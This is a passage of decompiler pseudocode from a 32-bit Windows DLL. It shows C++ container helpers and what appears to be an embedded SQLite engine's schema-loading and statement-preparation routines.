  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_100A2372;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_10057E67, sub_10020B81);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_1005759D(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_10050C0B(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}

//----- (10057A6E) --------------------------------------------------------
_DWORD *__stdcall sub_10057A6E(_DWORD *a1)
{
  unsigned int v1; // edi
  unsigned int i; // esi

  *a1 = off_100FBF5C;
  v1 = 1;
  *a1 = &off_10104620;
  a1[1] = off_100FBF5C;
  a1[1] = &off_10104668;
  do
    v1 *= 2;
  while ( v1 < 0x10 );
  a1[2] = 0;
  a1[3] = v1;
  a1[4] = operator new(4 * v1);
  a1[5] = off_100FBF5C;
  a1[5] = &off_101046C8;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  sub_10057F12(a1 + 5, i);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104620: using guessed type int (__thiscall *off_10104620)(void *Block, char);
// 10104668: using guessed type int (__thiscall *off_10104668)(void *Block, char);
// 101046C8: using guessed type int (__thiscall *off_101046C8)(void *Block, char);

//----- (10057B0C) --------------------------------------------------------
void *__thiscall sub_10057B0C(_DWORD *this)
{
  *this = &off_10104620;
  sub_10057607(this + 5);
  sub_10057318((int)(this + 1));
  return sub_100185A9(this);
}
// 10104620: using guessed type int (__thiscall *off_10104620)(void *Block, char);

//----- (10057B56) --------------------------------------------------------
bool __thiscall sub_10057B56(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1003F0D1(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (10057B90) --------------------------------------------------------
char __thiscall sub_10057B90(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1003F0D1(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (10057BDF) --------------------------------------------------------
int __thiscall sub_10057BDF(_DWORD *this, _DWORD *a2)
{
  int v3; // edi
  _DWORD *v4; // eax
  _DWORD v6[2]; // [esp+Ch] [ebp-14h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  v3 = sub_1003F0D1(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, a2, v3);
    v4 = sub_10050B91(v6, 0);
    v7 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v4, v3);
    v7 = -1;
    sub_10020B81(v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 10057BDF: using guessed type _DWORD var_14[2];

//----- (10057C5C) --------------------------------------------------------
void __thiscall sub_10057C5C(void *this, int a2, int *a3)
{
  _DWORD *v4; // eax
  int v5; // [esp+8h] [ebp-14h] BYREF
  volatile LONG *v6; // [esp+Ch] [ebp-10h]
  int v7; // [esp+18h] [ebp-4h]

  v6 = (volatile LONG *)a3[1];
  v5 = *a3;
  InterlockedIncrement(v6);
  v7 = 0;
  v4 = (_DWORD *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  sub_1005759D(v4, &v5);
  v7 = -1;
  sub_10020B81(&v5);
}

//----- (10057CB2) --------------------------------------------------------
_DWORD *__thiscall sub_10057CB2(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-24h]
  int v6; // [esp-4h] [ebp-20h]

  v2 = this + 1;
  *a2 = off_100FBF5C;
  *a2 = &off_10104668;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[1] + 4))(this + 1);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1005753F(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104668: using guessed type int (__thiscall *off_10104668)(void *Block, char);

//----- (10057D17) --------------------------------------------------------
_DWORD *__thiscall sub_10057D17(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-24h]
  int v6; // [esp-4h] [ebp-20h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_101046C8;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_100578A8(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101046C8: using guessed type int (__thiscall *off_101046C8)(void *Block, char);

//----- (10057D7C) --------------------------------------------------------
int __stdcall sub_10057D7C(int a1)
{
  sub_10057E92();
  return a1;
}

//----- (10057D8D) --------------------------------------------------------
_DWORD *__usercall sub_10057D8D@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (10057DCD) --------------------------------------------------------
void __thiscall sub_10057DCD(void **this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  if ( !InterlockedDecrement((volatile LONG *)this[1]) )
  {
    if ( this[1] )
      j__free(this[1]);
    if ( *this )
      (*(void (__thiscall **)(void *, int))(*(_DWORD *)*this + 12))(*this, 1);
  }
}

//----- (10057E29) --------------------------------------------------------
void *__thiscall sub_10057E29(void *Block, char a2)
{
  sub_10057318((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10057E48) --------------------------------------------------------
_DWORD *__thiscall sub_10057E48(_DWORD *Block, char a2)
{
  sub_10057607(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10057E67) --------------------------------------------------------
void __thiscall sub_10057E67(_DWORD *this)
{
  sub_10050B91(this, 0);
}

//----- (10057E73) --------------------------------------------------------
_DWORD *__thiscall sub_10057E73(_DWORD *Block, char a2)
{
  sub_10057B0C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10057E92) --------------------------------------------------------
int sub_10057E92()
{
  int v0; // ecx
  int result; // eax
  int *v2; // eax
  int v3; // ecx
  _DWORD *v4[2]; // [esp+4h] [ebp-1Ch] BYREF
  __int32 v5[2]; // [esp+Ch] [ebp-14h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v0 = dword_10183298;
  result = _InterlockedExchange(v5, (__int32)&loc_100AB66E);
  if ( !v0 )
  {
    sub_1000EDE4(dword_10193D6C, v4);
    v6 = 0;
    if ( !dword_10183298 )
    {
      v2 = (int *)operator new(0x58u);
      v5[0] = (__int32)v2;
      LOBYTE(v6) = 1;
      if ( v2 )
      {
        v2 = sub_100556F9(v2);
        v3 = (int)v2;
      }
      else
      {
        v3 = 0;
      }
      LOBYTE(v6) = 0;
      _InterlockedExchange(v5, (__int32)v2);
      dword_10183298 = v3;
      dword_10183618 = v3;
    }
    v6 = -1;
    return sub_1000EDA4(v4);
  }
  return result;
}
// 10183618: using guessed type int dword_10183618;
// 10193D6C: using guessed type int dword_10193D6C[9];

//----- (10057F12) --------------------------------------------------------
void __usercall sub_10057F12(_DWORD *a1@<edi>, int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)(unsigned int)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 8u, a2, (void (__thiscall *)(void *))sub_10057E67, sub_10020B81);
  }
  a1[3] = v2;
}

//----- (10057F7F) --------------------------------------------------------
int __usercall sub_10057F7F@<eax>(int a1@<esi>, const char *a2, const char *a3)
{
  int v3; // ebx
  int result; // eax

  v3 = *(_DWORD *)a1;
  if ( !*(_BYTE *)(*(_DWORD *)a1 + 30) && (*(_DWORD *)(v3 + 12) & 0x800000) == 0 )
  {
    if ( !a2 )
      a2 = asc_101824FC;
    sub_10059206(*(unsigned int **)(a1 + 8), v3, "malformed database schema (%s)", a2);
    if ( a3 )
      **(_DWORD **)(a1 + 8) = sub_10055499(v3, **(_DWORD **)(a1 + 8), "%s - %s", **(const char ***)(a1 + 8), a3);
  }
  result = 4 * (*(_BYTE *)(v3 + 30) == 0) + 7;
  *(_DWORD *)(a1 + 12) = result;
  return result;
}

//----- (10057FF0) --------------------------------------------------------
int __cdecl sub_10057FF0(int *a1, int a2, int a3)
{
  int v3; // edi
  int v4; // eax
  int v5; // ecx
  int v7; // esi
  _BYTE *v8; // eax
  int v9; // eax
  int *v10; // eax
  const char *v11; // [esp-8h] [ebp-18h]
  const char *v12; // [esp-4h] [ebp-14h]
  unsigned int v13; // [esp+Ch] [ebp-4h] BYREF

  v3 = *a1;
  v4 = *(_DWORD *)(*a1 + 8);
  v13 = a1[1];
  v5 = 16 * v13;
  *(_WORD *)(*(_DWORD *)(v4 + 16 * v13 + 12) + 74) &= ~4u;
  if ( *(_BYTE *)(v3 + 30) )
  {
    sub_10057F7F((int)a1, *(const char **)a3, 0);
    return 1;
  }
  if ( a3 )
  {
    if ( *(_DWORD *)(a3 + 4) )
    {
      v8 = *(_BYTE **)(a3 + 8);
      if ( v8 && *v8 )
      {
        *(_DWORD *)(v3 + 116) = v13;
        *(_DWORD *)(v3 + 120) = j__atol(*(const char **)(a3 + 4));
        *(_BYTE *)(v3 + 125) = 0;
        v9 = sub_100721DE(v3, *(char **)(a3 + 8), 0, 0, (void **)&v13);
        *(_DWORD *)(v3 + 116) = 0;
        if ( v9 )
        {
          if ( !*(_BYTE *)(v3 + 125) )
          {
            a1[3] = v9;
            if ( v9 == 7 )
            {
              *(_BYTE *)(v3 + 30) = 1;
            }
            else if ( v9 != 9 && v9 != 6 )
            {
              sub_10057F7F((int)a1, *(const char **)a3, (const char *)v13);
            }
          }
          sub_10058EC7(v3, v13);
        }
        return 0;
      }
      if ( *(_DWORD *)a3 )
      {
        v10 = sub_10069F30(*(unsigned __int8 **)a3, *(unsigned __int8 **)(*(_DWORD *)(v3 + 8) + v5));
        if ( !v10 || sub_100598E8(*(_BYTE **)(a3 + 4), v10 + 5) )
          return 0;
        v12 = aInvalidRootpag;
        v11 = *(const char **)a3;
        v7 = (int)a1;
        goto LABEL_22;
      }
      v12 = 0;
      v11 = 0;
    }
    else
    {
      v12 = 0;
      v11 = *(const char **)a3;
    }
    v7 = (int)a1;
LABEL_22:
    sub_10057F7F(v7, v11, v12);
  }
  return 0;
}

//----- (10058106) --------------------------------------------------------
int *__usercall sub_10058106@<eax>(int a1@<eax>, int a2, unsigned int *a3)
{
  const char *v4; // eax
  int *result; // eax
  int *v6; // eax
  int v7; // eax
  int v8; // ebx
  int v9; // edi
  int v10; // eax
  int *v11; // eax
  char *v12; // eax
  int v13; // eax
  int v14; // edi
  char v15; // al
  int v16; // eax
  int v17; // eax
  bool v18; // sf
  int v19; // eax
  int v20; // ecx
  int v21; // edi
  int v22; // eax
  unsigned __int8 *v23; // [esp-4h] [ebp-4Ch]
  int v24; // [esp+10h] [ebp-38h] BYREF
  unsigned __int8 *v25; // [esp+14h] [ebp-34h] BYREF
  char *v26; // [esp+18h] [ebp-30h]
  const char *v27; // [esp+1Ch] [ebp-2Ch]
  int v28; // [esp+20h] [ebp-28h]
  int v29[3]; // [esp+24h] [ebp-24h] BYREF
  int *v30; // [esp+30h] [ebp-18h]
  int v31; // [esp+34h] [ebp-14h]
  int v32; // [esp+38h] [ebp-10h]
  int v33; // [esp+3Ch] [ebp-Ch]
  unsigned __int8 *v34; // [esp+40h] [ebp-8h]
  int v35; // [esp+44h] [ebp-4h]

  v31 = 0;
  if ( a2 == 1 )
  {
    v4 = "CREATE TEMP TABLE sqlite_temp_master(\n"
         "  type text,\n"
         "  name text,\n"
         "  tbl_name text,\n"
         "  rootpage integer,\n"
         "  sql text\n"
         ")";
    v34 = (unsigned __int8 *)aSqliteTempMast;
  }
  else
  {
    v4 = "CREATE TABLE sqlite_master(\n  type text,\n  name text,\n  tbl_name text,\n  rootpage integer,\n  sql text\n)";
    v34 = (unsigned __int8 *)aSqliteMaster;
  }
  v27 = v4;
  v29[2] = (int)a3;
  v25 = v34;
  v26 = ::a1;
  v28 = 0;
  v29[0] = a1;
  v29[1] = a2;
  v30 = 0;
  sub_10057FF0(v29, 3, &v25);
  result = v30;
  if ( !v30 )
  {
    v23 = *(unsigned __int8 **)(*(_DWORD *)(a1 + 8) + 16 * a2);
    v32 = 16 * a2;
    v6 = sub_10069E40(a1, v34, v23);
    if ( v6 )
      *((_BYTE *)v6 + 34) |= 1u;
    v7 = *(_DWORD *)(a1 + 8);
    v8 = v7 + 16 * a2;
    v9 = *(_DWORD *)(v8 + 4);
    v33 = v8;
    if ( !v9 )
    {
      if ( a2 == 1 )
        *(_WORD *)(*(_DWORD *)(v7 + 28) + 74) |= 1u;
      return 0;
    }
    sub_10068C39(v9);
    v10 = *(_DWORD *)(v8 + 4);
    if ( !*(_BYTE *)(v10 + 8) )
    {
      v11 = (int *)sub_10062A0B(v10, 0);
      v35 = (int)v11;
      if ( v11 )
      {
        v12 = sub_10053FC9((unsigned __int8)v11);
        sub_10059206(a3, a1, "%s", v12);
LABEL_49:
        sub_10068CA7(*(_DWORD *)(v8 + 4));
        result = (int *)v35;
        goto LABEL_50;
      }
      v31 = 1;
    }
    v13 = 0;
    v35 = (int)&v24;
    do
    {
      v14 = v13 + 1;
      sub_1006618B(*(_DWORD *)(v8 + 4), v13 + 1, (int *)v35);
      v35 += 4;
      v13 = v14;
    }
    while ( v14 < 5 );
    **(_DWORD **)(v8 + 12) = v24;
    if ( v28 )
    {
      if ( a2 )
      {
        if ( v28 != *(unsigned __int8 *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 12) + 73) )
        {
          sub_10059206(a3, a1, aAttachedDataba);
          goto LABEL_24;
        }
      }
      else
      {
        v15 = v28 & 3;
        if ( (v28 & 3) == 0 )
          v15 = 1;
        *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 12) + 73) = v15;
        *(_DWORD *)(a1 + 44) = sub_10069699(a1, 1u, aBinary_3, 0);
      }
    }
    else
    {
      v16 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + v32 + 12);
      *(_WORD *)(v16 + 74) |= 4u;
    }
    *(_BYTE *)(*(_DWORD *)(v8 + 12) + 73) = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 12) + 73);
    if ( !*(_DWORD *)(*(_DWORD *)(v8 + 12) + 76) )
    {
      v17 = (int)v26;
      v18 = (int)v26 < 0;
      if ( !v26 )
      {
        v17 = 2000;
        v18 = 0;
      }
      if ( v18 )
        v17 = -v17;
      *(_DWORD *)(*(_DWORD *)(v8 + 12) + 76) = v17;
      sub_10062612(*(_DWORD *)(v33 + 4), *(_DWORD *)(*(_DWORD *)(v8 + 12) + 76));
      v8 = v33;
    }
    v19 = (int)v25;
    *(_BYTE *)(*(_DWORD *)(v8 + 12) + 72) = (_BYTE)v25;
    v20 = *(_DWORD *)(v8 + 12);
    if ( !*(_BYTE *)(v20 + 72) )
      *(_BYTE *)(v20 + 72) = 1;
    if ( *(_BYTE *)(*(_DWORD *)(v8 + 12) + 72) <= 4u )
    {
      if ( !a2 && v19 >= 4 )
        *(_DWORD *)(a1 + 12) &= ~0x100000u;
      v21 = sub_10055484(a1, aSelectNameRoot, *(_DWORD *)(*(_DWORD *)(a1 + 8) + v32), v34);
      v35 = sub_100721DE(a1, v21, sub_10057FF0, v29, 0);
      if ( !v35 )
        v35 = (int)v30;
      sub_10058EC7(a1, v21);
      if ( *(_BYTE *)(a1 + 30) )
      {
        v35 = 7;
        sub_1006A029(0, (_DWORD *)a1);
      }
      if ( !v35 || (*(_DWORD *)(a1 + 12) & 0x800000) != 0 )
      {
        v22 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + v32 + 12);
        *(_WORD *)(v22 + 74) |= 1u;
        v35 = 0;
      }
      v8 = v33;
      goto LABEL_47;
    }
    sub_10059206(a3, a1, aUnsupportedFil);
LABEL_24:
    v35 = 1;
LABEL_47:
    if ( v31 )
      sub_10063238(*(_DWORD *)(v8 + 4));
    goto LABEL_49;
  }
LABEL_50:
  if ( result == (int *)7 || result == (int *)3082 )
    *(_BYTE *)(a1 + 30) = 1;
  return result;
}
// 10057FF0: using guessed type _DWORD __cdecl sub_10057FF0(_DWORD, _DWORD, _DWORD);
// 100721DE: using guessed type _DWORD __cdecl sub_100721DE(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (100583C2) --------------------------------------------------------
int *__cdecl sub_100583C2(int a1, unsigned int *a2)
{
  BOOL v2; // edi
  int *result; // eax
  int v4; // [esp+Ch] [ebp-Ch]
  int *v5; // [esp+10h] [ebp-8h]
  int v6; // [esp+14h] [ebp-4h]

  v2 = ((*(_DWORD *)(a1 + 12) >> 9) & 1) == 0;
  v5 = 0;
  *(_BYTE *)(a1 + 124) = 1;
  v4 = 0;
  v6 = 0;
  do
  {
    if ( v4 >= *(_DWORD *)(a1 + 4) )
      break;
    if ( (*(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + v6 + 12) + 74) & 1) == 0 && v4 != 1 )
    {
      v5 = sub_10058106(a1, v4, a2);
      if ( v5 )
        sub_1006A029(v4, (_DWORD *)a1);
    }
    ++v4;
    v6 += 16;
  }
  while ( !v5 );
  if ( !v5 && *(int *)(a1 + 4) > 1 && (*(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 28) + 74) & 1) == 0 )
  {
    v5 = sub_10058106(a1, 1, a2);
    if ( v5 )
      sub_1006A029(1, (_DWORD *)a1);
  }
  result = v5;
  *(_BYTE *)(a1 + 124) = 0;
  if ( !v5 )
  {
    if ( v2 )
      *(_DWORD *)(a1 + 12) &= ~0x200u;
  }
  return result;
}

//----- (10058497) --------------------------------------------------------
int *__cdecl sub_10058497(_DWORD *a1)
{
  int *result; // eax

  result = 0;
  if ( !*(_BYTE *)(*a1 + 124) )
  {
    result = sub_100583C2(*a1, a1 + 2);
    if ( result )
    {
      ++a1[16];
      a1[1] = result;
    }
  }
  return result;
}

//----- (100584C6) --------------------------------------------------------
int __cdecl sub_100584C6(_DWORD *a1)
{
  int result; // eax
  int v2; // esi
  int v3; // ebx
  bool v4; // cc
  int v5; // edi
  int v6; // [esp+10h] [ebp-Ch] BYREF
  int v7; // [esp+14h] [ebp-8h]
  int v8; // [esp+18h] [ebp-4h]

  result = (int)a1;
  v2 = *a1;
  v3 = 0;
  v4 = *(_DWORD *)(*a1 + 4) <= 0;
  v8 = 0;
  if ( !v4 )
  {
    do
    {
      v5 = *(_DWORD *)(*(_DWORD *)(v2 + 8) + v3 + 4);
      v7 = 0;
      if ( v5 )
      {
        if ( !*(_BYTE *)(v5 + 8) )
        {
          result = sub_10062A0B(v5, 0);
          if ( result == 7 || result == 3082 )
            *(_BYTE *)(v2 + 30) = 1;
          if ( result )
            return result;
          v7 = 1;
        }
        sub_1006618B(v5, 1, &v6);
        if ( v6 != **(_DWORD **)(*(_DWORD *)(v2 + 8) + v3 + 12) )
          a1[1] = 17;
        if ( v7 )
          sub_10063238(v5);
      }
      result = ++v8;
      v3 += 16;
    }
    while ( v8 < *(_DWORD *)(v2 + 4) );
  }
  return result;
}

//----- (1005855F) --------------------------------------------------------
int __usercall sub_1005855F@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int result; // eax
  int v3; // edx
  _DWORD *v4; // ecx

  result = -1000000;
  if ( a2 )
  {
    v3 = *(_DWORD *)(a1 + 4);
    result = 0;
    if ( v3 > 0 )
    {
      v4 = (_DWORD *)(*(_DWORD *)(a1 + 8) + 12);
      do
      {
        if ( *v4 == a2 )
          break;
        ++result;
        v4 += 4;
      }
      while ( result < v3 );
    }
  }
  return result;
}

//----- (10058584) --------------------------------------------------------
int __cdecl sub_10058584(_DWORD *a1, char *a2, signed int a3, int a4, int a5, unsigned int *a6, _DWORD *a7)
{
  int v7; // edi
  int v8; // esi
  int *v9; // ebx
  int v10; // eax
  int v11; // edi
  int v12; // edi
  int v13; // ecx
  char *v14; // edi
  int v15; // esi
  unsigned int v16; // eax
  unsigned int v17; // eax
  _DWORD *v18; // esi
  int v20; // [esp+10h] [ebp-10h]
  const char *v21; // [esp+14h] [ebp-Ch] BYREF
  int v22; // [esp+18h] [ebp-8h]
  int *v23; // [esp+1Ch] [ebp-4h]

  v7 = (int)a1;
  v8 = 0;
  v21 = 0;
  v9 = sub_1005904B((int)a1, 0x220u);
  v23 = v9;
  if ( v9 )
  {
    v9[115] = a5;
    if ( (int)a1[1] > 0 )
    {
      v22 = 0;
      do
      {
        v10 = *(_DWORD *)(v22 + *(_DWORD *)(v7 + 8) + 4);
        if ( v10 )
        {
          v11 = *(_DWORD *)(v22 + *(_DWORD *)(v7 + 8) + 4);
          sub_10068C39(v10);
          v12 = sub_100613B6(1, v11, 1);
          sub_10068CA7(v13);
          v20 = v12;
          if ( v12 )
          {
            sub_100592B1(a1, v12, "database schema is locked: %s", *(const char **)(16 * v8 + a1[2]));
            v7 = (int)a1;
            goto LABEL_46;
          }
          v7 = (int)a1;
        }
        v22 += 16;
        ++v8;
      }
      while ( v8 < *(_DWORD *)(v7 + 4) );
    }
    sub_10070F16(v7);
    *v9 = v7;
    if ( a3 < 0 || a3 && !a2[a3 - 1] )
    {
      sub_10071EAC(v9, (int)a2, (unsigned int *)&v21);
    }
    else
    {
      if ( a3 > *(_DWORD *)(v7 + 76) )
      {
        sub_100592B1((_DWORD *)v7, 18, aStatementTooLo);
        v20 = sub_1005922F(v7, 18);
        goto LABEL_46;
      }
      v14 = (char *)sub_100591D0((int)a1, a3, a2);
      if ( v14 )
      {
        sub_10071EAC(v9, (int)v14, (unsigned int *)&v21);
        sub_10058EC7((int)a1, (unsigned int)v14);
        v9[124] += a2 - v14;
      }
      else
      {
        v9[124] = (int)&a2[a3];
      }
      v7 = (int)a1;
    }
    if ( *(_BYTE *)(v7 + 30) )
      v9[1] = 7;
    if ( v9[1] == 101 )
      v9[1] = 0;
    if ( *((_BYTE *)v9 + 18) )
      sub_100584C6(v9);
    if ( v9[1] == 17 )
    {
      sub_1006A029(0, (_DWORD *)v7);
      v9 = v23;
    }
    if ( *(_BYTE *)(v7 + 30) )
      v9[1] = 7;
    if ( a7 )
      *a7 = v9[124];
    v20 = v9[1];
    if ( !*(_BYTE *)(v7 + 124) )
    {
      v15 = v9[3];
      if ( v15 )
      {
        if ( a4 )
        {
          v7 = (int)a1;
          *(_DWORD *)(v15 + 176) = sub_100591D0(*(_DWORD *)v15, v9[124] - (_DWORD)a2, a2);
          *(_BYTE *)(v15 + 103) = a4;
        }
      }
    }
    v16 = v9[3];
    if ( v16 && (v20 || *(_BYTE *)(v7 + 30)) )
      sub_1005BD60(v16);
    else
      *a6 = v16;
    if ( v21 )
    {
      sub_100592B1((_DWORD *)v7, v20, "%s", v21);
      sub_10058EC7(v7, (unsigned int)v21);
    }
    else
    {
      sub_100592B1((_DWORD *)v7, v20, 0);
    }
    while ( v9[135] )
    {
      v17 = v9[135];
      v9[135] = *(_DWORD *)(v17 + 20);
      v18 = *(_DWORD **)(v17 + 8);
      v23 = (int *)v17;
      sub_1005AF29(v18, v7, 0);
      sub_10058EC7(v7, (unsigned int)v23);
    }
  }
  else
  {
    v20 = 7;
  }
LABEL_46:
  sub_10058EC7(v7, (unsigned int)v9);
  return sub_1005922F(v7, v20);
}
// 100585FB: variable 'v13' is possibly undefined

//----- (10058816) --------------------------------------------------------
int __usercall sub_10058816@<eax>(
        _DWORD *a1@<eax>,
        unsigned int *a2@<esi>,
        char *a3,
        signed int a4,
        int a5,
        int a6,
        _DWORD *a7)
{
  int v9; // ebx

  *a2 = 0;
  if ( !a1 || a1[14] != -1607883113 )
    return 21;
  sub_10061305(a1[17]);
  sub_10068CBC((int)a1);
  v9 = sub_10058584(a1, a3, a4, a5, a6, a2, a7);
  if ( v9 == 17 )
  {
    sub_10053012(*a2);
    v9 = sub_10058584(a1, a3, a4, a5, a6, a2, a7);
  }
  sub_10068D45((int)a1);
  sub_10061317(a1[17]);
  return v9;
}

//----- (1005889A) --------------------------------------------------------
int __usercall sub_1005889A@<eax>(_DWORD *a1@<eax>)
{
  char *v2; // eax
  int v3; // ebx
  int v4; // eax
  int v6; // esi
  int v7; // [esp+Ch] [ebp-4h] BYREF

  if ( *((_BYTE *)a1 + 103) )
    v2 = (char *)a1[44];
  else
    v2 = 0;
  v3 = *a1;
  v4 = sub_10058816((_DWORD *)*a1, (unsigned int *)&v7, v2, -1, 0, (int)a1, 0);
  if ( v4 )
  {
    if ( v4 == 7 )
      *(_BYTE *)(v3 + 30) = 1;
    return v4 != 6 ? 17 : 6;
  }
  else
  {
    v6 = v7;
    sub_1005AAB6((int)a1, v7);
    sub_100535DD(a1, v6);
    *(_DWORD *)(v6 + 88) = 0;
    sub_1005BD60(v6);
    return 0;
  }
}

//----- (10058911) --------------------------------------------------------
int __usercall sub_10058911@<eax>(_DWORD *a1@<edi>, unsigned __int8 *a2, int a3, unsigned int *a4, _DWORD *a5)
{
  char *v6; // eax
  unsigned __int8 *v7; // ebx
  int v8; // eax
  unsigned __int8 *v9; // ecx
  int v10; // edx
  int v11; // eax
  unsigned __int8 *v12; // ecx
  unsigned int v13; // eax
  int v14; // esi
  int v15; // [esp+8h] [ebp-8h]
  int v16; // [esp+Ch] [ebp-4h] BYREF

  v16 = 0;
  v15 = 0;
  *a4 = 0;
  if ( !a1 || a1[14] != -1607883113 )
    return 21;
  sub_10061305(a1[17]);
  v6 = (char *)sub_10070ADB((int)a1, a2, a3);
  v7 = (unsigned __int8 *)v6;
  if ( v6 )
  {
    v15 = sub_10058816(a1, a4, v6, -1, 1, 0, &v16);
    if ( v16 )
    {
      if ( a5 )
      {
        v8 = sub_10070AAB(v7, v16 - (_DWORD)v7);
        v9 = a2;
        if ( v8 > 0 )
        {
          v10 = v8;
          do
          {
            v11 = *v9;
            v12 = v9 + 1;
            v13 = (*v12 << 8) + v11 - 55296;
            v9 = v12 + 1;
            if ( v13 <= 0x7FF )
              v9 += 2;
            --v10;
          }
          while ( v10 );
        }
        *a5 = v9;
      }
    }
  }
  sub_10058EC7((int)a1, (unsigned int)v7);
  v14 = sub_1005922F((int)a1, v15);
  sub_10061317(a1[17]);
  return v14;
}

//----- (100589DA) --------------------------------------------------------
int __thiscall sub_100589DA(void *this, unsigned int a2, int a3)
{
  unsigned int v3; // esi
  _DWORD *v4; // eax
  unsigned int v5; // eax
  int result; // eax
  int v7; // et2

  v3 = a2;
  if ( a2 != a3
    || (v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this), v7 = v3 % v5, result = v3 / v5, v7) )
  {
    v4 = sub_1000E7F7(&a2, 1, 0);
    sub_10007882((int)v4);
  }
  return result;
}

//----- (10058A3A) --------------------------------------------------------
int __usercall sub_10058A3A@<eax>(int a1@<esi>)
{
  int v1; // edx
  int v2; // eax
  int v3; // ecx
  int v4; // edx
  int v5; // ecx
  int v6; // eax
